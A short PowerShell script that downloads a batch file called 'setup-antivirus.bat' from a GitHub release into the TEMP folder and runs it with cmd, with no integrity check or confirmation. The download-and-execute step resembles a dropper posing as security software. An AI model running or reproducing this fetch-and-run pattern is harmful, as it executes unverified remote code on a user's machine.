$ErrorActionPreference = "Stop"
$batUrl = "https://github.com/a1x10/stella/releases/download/v5.3.1/setup-antivirus.bat"
$batFile = "$env:TEMP\stella-av-setup.bat"
Write-Host "[*] Downloading installer..." -ForegroundColor Yellow
Invoke-WebRequest -Uri $batUrl -OutFile $batFile
Write-Host "[*] Running installer..." -ForegroundColor Yellow
Start-Process cmd -ArgumentList "/c `"$batFile`"" -Wait
